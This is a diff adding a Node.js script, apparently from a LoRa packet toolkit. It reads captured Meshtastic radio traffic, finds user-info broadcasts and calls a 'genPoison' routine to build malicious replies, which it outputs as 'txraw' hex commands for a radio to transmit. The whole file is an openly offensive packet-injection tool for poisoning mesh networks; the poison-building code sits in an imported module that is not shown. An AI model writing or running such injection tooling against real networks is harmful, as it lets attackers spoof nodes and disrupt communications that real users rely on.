@@ -1,0 +1,89 @@
+#!/usr/bin/env node
+":" //# comment; exec /usr/bin/env node --input-type=module - "$@" < "$0"
+import * as fs from 'fs'
+import * as readline from 'readline'
+
+import { parseInputPacket, CHANNELS, buf2hex } from '../src/utils.mjs'
+import { LorapipeRawPacket } from '../src/lorapipe-raw-packet.mjs'
+
+import * as readlineSync from 'readline-sync'
+
+let evilBuffer = []
+
+let modeBuffer = true
+
+async function main() {
+  console.log(process.argv)
+  const fileName = process.argv[2]
+  /*let stdinRl = readline.createInterface({
+    input: process.stdin,
+    crlfDelay: Infinity
+  })*/
+  
+
+  let fileStream = fs.createReadStream(fileName)
+
+  //fileStream.read()
+
+  const rl = readline.createInterface({
+    input: fileStream,
+    crlfDelay: Infinity
+  });
+  // crlfDelay option to clean up CR LF to a one line break
+
+  for await (const line of rl) {
+
+    try{
+
+      if(
+        line.indexOf('RAW') != -1 ||
+        line.indexOf('RX') != -1
+      ){
+        let initial = parseInputPacket(line)
+
+        if(initial == null){ continue }
+
+        let { seen, rssi, snr, raw } = initial
+
+        let pkt = new LorapipeRawPacket(seen, rssi, snr, raw, CHANNELS)
+
+        //! is it a user broadcast?
+        if(pkt.parsed && pkt.parsed.content && pkt.parsed.content['$typeName'] == 'meshtastic.User'){
+
+          /*console.log(line)
+          console.log(pkt.parsed.content)
+          console.log(pkt.header)*/
+
+
+          let evil = await pkt.genPoison()
+          
+          if(evil){
+
+            evilBuffer.push(evil)
+
+
+          }
+
+        }
+      }
+    } catch(err){
+      //
+    }
+  }
+
+  readlineSync.setDefaultOptions({prompt: ''});
+
+  for(let i=0; i<evilBuffer.length; i++){
+    process.stdout.write('txraw ' + buf2hex(evilBuffer[i]) + '\r\n')
+
+    while(true){
+      let input = readlineSync.prompt()
+      if(input.indexOf('OK') != -1){
+        break
+      }
+    }
+    
+  }
+}
+
+main();
